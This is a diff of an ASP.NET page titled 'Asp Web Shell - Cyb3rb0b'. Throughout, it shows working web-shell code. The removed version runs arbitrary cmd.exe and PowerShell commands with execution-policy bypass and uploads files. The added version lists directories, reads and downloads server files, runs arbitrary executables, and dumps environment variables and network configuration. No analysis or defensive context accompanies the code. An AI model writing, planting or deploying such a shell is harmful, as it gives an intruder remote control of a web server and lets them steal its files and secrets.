@@ -1,14 +1,14 @@
 <%@ Page Language="C#" Debug="true" Trace="false" %>
+
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Net" %>
 <html>
 
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<link href="//netdna.bootstrapcdn.com/bootstrap/3.1.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
-<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
 
-<script src="//netdna.bootstrapcdn.com/bootstrap/3.1.0/js/bootstrap.min.js"></script>
+
 
     <style>
         body {
@@ -16,243 +16,312 @@
             color: #FFFFFF;
             overflow: hidden;
         }
-        #txtArg{
-            border:1px solid cyan;
+
+        td:nth-child(0n + 2) {
+            color: green;
         }
-        input{
-            color:black;
-        }
-       
     </style>
     <title>Asp Web Shell - Cyb3rb0b</title>
-   
+
 </head>
 <script language="c#" runat="server">
 
-  
 
 
-    class ExecuteResult
+    string Dir(string path)
     {
-        public bool IsError { get; set; }
-        public string Message { get; set; }
+        StringBuilder sbl = new StringBuilder();
+        if (path.StartsWith("~"))
+        {
+            path = Server.MapPath(path);
+            sbl.Append("Directory: " + path + "<br/><br/>");
+        }
+        if (Directory.Exists(path))
+        {
+
+            sbl.Append("<table>");
+            string[] folders = Directory.GetDirectories(path);
+            foreach (string d in folders)
+            {
+                DirectoryInfo info = new DirectoryInfo(d);
+                sbl.Append("<tr>");
+                sbl.Append("<td>" + info.CreationTime.ToString("dd/MM/yyyy HH:MM") + "</td>");
+                sbl.Append("<td>&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;</td>");
+                sbl.Append("<td>" + info.Name + "</td>");
+
+                sbl.Append("</tr>");
+            }
+
+            string[] files = Directory.GetFiles(path);
+            foreach (string f in files)
+            {
+                FileInfo info = new FileInfo(f);
+                sbl.Append("<tr>");
+                sbl.Append("<td>" + info.CreationTime.ToString("dd/MM/yyyy HH:MM") + "</td>");
+                sbl.Append("<td>&nbsp;&nbsp;" + info.Length.ToString() + "&nbsp;&nbsp;</td>");
+                sbl.Append("<td>" + info.Name + "</td>");
+                sbl.Append("</tr>");
+            }
+
+            sbl.Append("</table>");
+            return sbl.ToString();
+        }
+        else
+        {
+            return "<div style='color:red'>File Not Found " + path + "</div>";
+        }
+
     }
 
-  
-    void Page_Load(object sender, EventArgs e)
+    string Read(string filename)
     {
-        this.SetFocus(this.txtArg);
-        if (!IsPostBack)
+        StringBuilder sbl = new StringBuilder();
+        if (File.Exists(filename))
         {
-            this.setColor();
-            string folder = Server.MapPath("~");
-            StringBuilder sbl = new StringBuilder();
-            sbl.Append("<table>");
-            sbl.AppendFormat("<tr><td>Machine Name</td><td> {0}</td></tr>", Environment.MachineName);
-            sbl.AppendLine();
-            sbl.AppendFormat("<tr><td>Os Version</td><td> {0}</td></tr>", Environment.OSVersion);
-            sbl.AppendLine();
-            sbl.AppendFormat("<tr><td>User Domain Name</td><td> {0}</td></tr>", Environment.UserDomainName);
-            sbl.AppendLine();
-            sbl.AppendFormat("<tr><td>User Name</td><td> {0}</td></tr>", Environment.UserName);
-            sbl.AppendLine();
-            sbl.AppendFormat("<tr><td>Current Folder</td><td> {0}</td></tr></table>", folder);
-            
+            string content = File.ReadAllText(filename);
+
+            sbl.Append("Content of " + filename + "<br/>");
+            sbl.Append("<div style='border-style:groove'>" + content + "</div>");
 
 
-            IDictionary environmentVariables = Environment.GetEnvironmentVariables();
-            foreach (DictionaryEntry de in environmentVariables)
+        }
+        else
+        {
+            sbl.Append("<div style='color:red'>File Not Found " + filename + "</div>");
+        }
+
+        return sbl.ToString();
+    }
+
+    void Download(string filename)
+    {
+        if (File.Exists(filename))
+        {
+            FileInfo info = new FileInfo(filename);
+            System.Web.HttpResponse response = System.Web.HttpContext.Current.Response;
+            response.ClearContent();
+            response.Clear();
+            response.ContentType = "application/unknown";
+            response.AddHeader("Content-Disposition", "attachment; filename=" + info.Name + ";");
+            response.TransmitFile(filename);
+            response.Flush();
+            response.End();
+
+        }
+        else
+        {
+            this.dvResult.InnerHtml = "<div style='color:red'>File Not Found " + filename + "</div>";
+        }
+    }
+
+    string Run(string filename, string arguments = null)
+    {
+        StringBuilder sb = new StringBuilder();
+        if (File.Exists(filename))
+        {
+            Process process = new Process();
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = filename;
+            psi.RedirectStandardOutput = true;
+            if (arguments != null)
             {
-                sbl.AppendLine();
-                sbl.AppendFormat("<tr><td>{0}</td><td> {1}</td></tr></table>", de.Key, de.Value);
-                Console.WriteLine("  {0} = {1}", de.Key, de.Value);
+
+                psi.Arguments = arguments.Replace("run", "").Replace(filename, "").TrimStart(); ;
+            }
+            psi.RedirectStandardError = true;
+            psi.UseShellExecute = false;
+            process.StartInfo = psi;
+            process.Start();
+
+
+            StreamReader myStreamReader = process.StandardError;
+            string error = myStreamReader.ReadToEnd();
+
+            StreamReader stmrdr = process.StandardOutput;
+            string s = stmrdr.ReadToEnd();
+            stmrdr.Close();
+
+            if (myStreamReader != null)
+            {
+                myStreamReader.Close();
+            }
+
+            sb.Append("<div style='color:red'>" + error + "</div>");
+            sb.Append("<div style='color:green'>" + s + "</div>");
+
+        }
+        else
+        {
+            sb.Append("<div style='color:red'>File Not Found " + filename + "</div>");
+        }
+
+        return sb.ToString();
+    }
+
+    string Info()
+    {
+        string folder = Server.MapPath("~");
+        StringBuilder sbl = new StringBuilder();
+        sbl.Append("<table>");
+        sbl.AppendFormat("<tr><td><span style='color:green'>Machine Name</span></td><td> {0}</td></tr>", Environment.MachineName);
+        sbl.AppendLine();
+        sbl.AppendFormat("<tr><td><span style='color:green'>Os Version</span></td><td> {0}</td></tr>", Environment.OSVersion);
+        sbl.AppendLine();
+        sbl.AppendFormat("<tr><td><span style='color:green'>User Domain Name</span></td><td> {0}</td></tr>", Environment.UserDomainName);
+        sbl.AppendLine();
+        sbl.AppendFormat("<tr><td><span style='color:green'>User Name</span></td><td> {0}</td></tr>", Environment.UserName);
+        sbl.AppendLine();
+        sbl.AppendFormat("<tr><td><span style='color:green'>Current Folder</span></td><td> {0}</td></tr></table>", folder);
+
+
+
+        IDictionary environmentVariables = Environment.GetEnvironmentVariables();
+        foreach (DictionaryEntry de in environmentVariables)
+        {
+            sbl.AppendLine();
+            sbl.AppendFormat("<tr><td><span style='color:green'>{0}</span></td><td> {1}</td></tr></table>", de.Key, de.Value);
+
+        }
+
+        return sbl.ToString();
+    }
+
+    string IpConfig()
+    {
+        StringBuilder sbl = new StringBuilder();
+        sbl.Append("<table>");
+        sbl.Append("<tr><td>Hostname:</td><td>" + Dns.GetHostName() + "</td></tr>");
+
+        foreach (System.Net.NetworkInformation.NetworkInterface iface in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
+        {
+
+            sbl.Append("<tr><td ><span style='color:yellow;font-weight=bold'>" + iface.Name + "</span></td><td><span style='color:cyan'>" + iface.OperationalStatus.ToString() + "</span></td></tr>");
+            var properties = iface.GetIPProperties();
+
+            foreach (var address in properties.UnicastAddresses)
+            {
+
+                if (address.Address.IsIPv6LinkLocal)
+                {
+                    sbl.Append("<tr><td>Link-local IPv6 Address . . . . . :</td><td><span style='font-weight:bold'>" + address.Address.ToString() + "</span></td></tr>");
+                }
+                else
+                {
+                    sbl.Append("<tr><td>IPv4 Address . . . . . :</td><td><span style='font-weight:bold'>" + address.Address.ToString() + "</span></td></tr>");
+                }
+
+            }
+
+            if (properties.GatewayAddresses.Count > 0)
+            {
+                sbl.Append("<tr><td>Gateway . . . . . :</td><td><ul>");
+                foreach (var gw in iface.GetIPProperties().GatewayAddresses)
+                {
+
+                    sbl.Append("<li>" + gw.Address.ToString() + "</li>");
+                }
+                sbl.Append("</ul></td></tr>");
             }
 
 
-            this.dvResult.InnerHtml += sbl.ToString() + "<hr/>";
+            sbl.Append("<tr><td>MAC . . . . . . . :</td><td>"+iface.GetPhysicalAddress().ToString()+"</td></tr>");
+            sbl.Append("<tr><td colspan='2'><hr/></td></tr>");
+
         }
+
+        sbl.Append("</table>");
+
+        return sbl.ToString();
     }
 
-    ExecuteResult ExcuteCmd(string arg)
+    string Ping(string host)
     {
-        ExecuteResult result = new ExecuteResult();
-        ProcessStartInfo psi = new ProcessStartInfo();
-        Process p = new Process();
-        string error = string.Empty;
-        StreamReader myStreamReader = null;
-        if (this.shelloptions.SelectedValue.Equals("1"))
+        StringBuilder sbl = new StringBuilder();
+        System.Net.NetworkInformation.PingOptions options = new System.Net.NetworkInformation.PingOptions();
+        options.DontFragment = true;
+        string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+        byte[] buffer = Encoding.ASCII.GetBytes(data);
+        System.Net.NetworkInformation.Ping ping = new System.Net.NetworkInformation.Ping();
+        System.Net.NetworkInformation.PingReply reply = ping.Send(host, 120, buffer, options);
+        sbl.Append("<table>");
+        
+        if (reply.Status == System.Net.NetworkInformation.IPStatus.Success)
         {
-            psi.FileName = "powershell.exe";
-            psi.Arguments = "-nop -exec bypass " + arg;
+            sbl.Append("<tr><td>Pinging " + reply.Address.ToString() + " with " + reply.Buffer.Length.ToString() + " bytes of data:</td></tr>");
+
+            sbl.Append("<tr><td>Reply from " + reply.Address.ToString() + " bytes=" + reply.Buffer.Length.ToString() + " time<" + reply.RoundtripTime + "ms TTL=" + reply.Options.Ttl.ToString() + "</td></tr>");
+            
         }
-        else if (this.shelloptions.SelectedValue.Equals("0"))
-        {
-            psi.FileName = "cmd.exe";
-            psi.Arguments = "/c " + arg;
+            else
+            {
+                sbl.Append("<tr><td>Pinging " + host + " with " + buffer.Length.ToString() + " bytes of data:</td></tr>");
+                sbl.Append("<tr><td>Request " + reply.Status.ToString() + "</td></tr>");
+            }
+        sbl.Append("</table>");
+        return sbl.ToString();
 
 
-        }
-
-        psi.RedirectStandardOutput = true;
-        psi.RedirectStandardError = true;
-        psi.UseShellExecute = false;
-        p.StartInfo = psi;
-        p.Start();
-
-        if (psi.FileName == "cmd.exe")
-        {
-            myStreamReader = p.StandardError;
-            error = myStreamReader.ReadToEnd();
-
-        }
-
-        StreamReader stmrdr = p.StandardOutput;
-        string s = stmrdr.ReadToEnd();
-        stmrdr.Close();
-
-        if (myStreamReader != null)
-        {
-            myStreamReader.Close();
-        }
-
-        if (string.IsNullOrEmpty(error))
-        {
-            result.IsError = false;
-            result.Message = s;
-        }
-        else
-        {
-            result.IsError = true;
-            result.Message = error;
-        }
-
-        return result;
     }
 
-    void dir(string folder)
-        {
-        //Directory.GetFiles()
-        }
-
-    void run(string command)
+    protected void Cmdrun_Click(object sender, EventArgs e)
     {
-        ExecuteResult result = ExcuteCmd(command);
-        if (!result.IsError)
+        string[] commands = this.txtArg.Text.Split(new char[] { ' ' });
+        string command = commands[0];
+        string result = string.Empty;
+        switch (command.ToLower())
         {
-            this.addResult(Server.HtmlEncode(result.Message));
+            case "dir":
+                result = this.Dir(commands[1]);
+                break;
+            case "cat":
+                result = this.Read(commands[1]);
+                break;
+            case "download":
+                this.Download(commands[1]);
+                break;
+            case "run":
+                result = this.Run(commands[1], this.txtArg.Text);
+                break;
+            case "info":
+                result = this.Info();
+                break;
+            case "ipconfig":
+                result = this.IpConfig();
+                break;
+            case "ping":
+                result = this.Ping(commands[1]);
+                break;
         }
-        else
-        {
-            this.addResult("<div style='color:red'>" + Server.HtmlEncode(result.Message) + "</div>");
-        }
-    }
 
-
-    void cmdExe_Click(object sender, System.EventArgs e)
-    {
-
-
-        if (this.txtArg.Text.ToLower().Equals("cls"))
-        {
-            this.dvResult.InnerHtml = string.Empty;
-        }
-        else
-        {
-            this.run(this.txtArg.Text);
-        }
-
-        this.txtArg.Text = string.Empty;
-
+        this.dvResult.InnerHtml = result;
     }
 
     protected void uploadfile_Click(object sender, EventArgs e)
     {
-        this.upload.Visible = true;
-        this.uploadcmd.Enabled = true;
-    }
-
-    protected void uploadcmd_Click(object sender, EventArgs e)
-    {
-        try
-        {
-            string path = Path.Combine(this.txtTo.Text, this.file.FileName);
-            this.file.SaveAs(path);
-            this.addResult("<div style='color:#f1bc31'>File Uploaded to: " + path + "</div>");
-
-        }
-        catch (Exception ex)
-        {
-            this.addResult("<div style='color:red'>" + ex.Message + "</div>");
-        }
-        finally
-        {
-            this.upload.Visible = false;
-            this.uploadcmd.Enabled = false;
-        }
-
 
     }
-
-    private void addResult(string result)
-    {
-        this.dvResult.InnerHtml = "<hr/><div style='color:yellow'>" + DateTime.Now.ToString("HH:MM:ss") + "</div>" + result +
-            this.dvResult.InnerHtml;
-    }
-
-    protected void shelloptions_SelectedIndexChanged(object sender, EventArgs e)
-    {
-        this.setColor();
-    }
-
-    private void setColor()
-    {
-        if (this.shelloptions.SelectedValue.Equals("0"))
-        {
-            this.directory.Text = Environment.CurrentDirectory + ">";
-            this.body.Attributes.Add("style", "background-color:#000000");
-            this.txtArg.Attributes.Add("style", "background-color:#000000;width: 50%;color: #FFFF;font-weight: bold;");
-        }
-        else
-        {
-            this.directory.Text = "PS -nop -exec bypass >";
-            this.body.Attributes.Add("style", "background-color:#012456");
-            this.txtArg.Attributes.Add("style", "background-color:#012456;width: 50%;color: #FFFF;font-weight: bold;");
-
-        }
-    }
-
-    
 </script>
-<body id="body" runat="server">
+<body id="body" runat="server" style="background-color: #000000">
 
 
-   
+
     <form id="cmd" method="post" runat="server">
-        
-        
+
+
 
         <div style="overflow: auto; height: 90%">
-            <div id="upload" runat="server" visible="false">
-                <asp:FileUpload ID="file" runat="server" />
-                <asp:Label ID="lblTo" runat="server" Text="Destination Folder"></asp:Label>
-                <asp:TextBox ID="txtTo" runat="server" style="color:black"></asp:TextBox>
-                <asp:Button ID="uploadcmd" runat="server" Text="Upload"  style="color:black" OnClick="uploadcmd_Click" Enabled="false" />
-                
-            </div>
-            <pre id="dvResult" style="background-color:#000000;color:#FFF"  runat="server" class="">
+
+            <pre id="dvResult" style="color: #FFF; height: 80%" runat="server" class="">
             </pre>
         </div>
 
 
-        <div style="position: absolute; bottom: 0; width: 100%; left: 0; border: none">
-            <asp:Label ID="directory" runat="server"></asp:Label>
-            <asp:TextBox ID="txtArg" runat="server" Style="width: 50%; color: #FFFF; font-weight: bold;"></asp:TextBox>
-            <asp:Button ID="testing" cssClass="btn btn-warning btn-sm" runat="server" Text="..." OnClick="cmdExe_Click"></asp:Button>
-            <asp:Button cssClass="btn btn-success btn-sm" ID="uploadfile" runat="server" Text="Upload File" OnClick="uploadfile_Click" />
-            <asp:DropDownList ID="shelloptions" runat="server" OnSelectedIndexChanged="shelloptions_SelectedIndexChanged" AutoPostBack="true" style="background-color:red">
-                <asp:ListItem Text="Cmd" Value="0"></asp:ListItem>
-                <asp:ListItem Text="PowerShell" Value="1"></asp:ListItem>
-            </asp:DropDownList>
+        <div style="background-color: #000000; position: absolute; bottom: 0; width: 100%; left: 0; border: none">
+
+            <asp:TextBox ID="txtArg" runat="server" Style="width: 80%; color: #000000; font-weight: bold;"></asp:TextBox>
+            <asp:Button ID="testing" CssClass="btn btn-warning btn-sm" runat="server" Text="..." OnClick="Cmdrun_Click"></asp:Button>
+
+
         </div>
 
     </form>
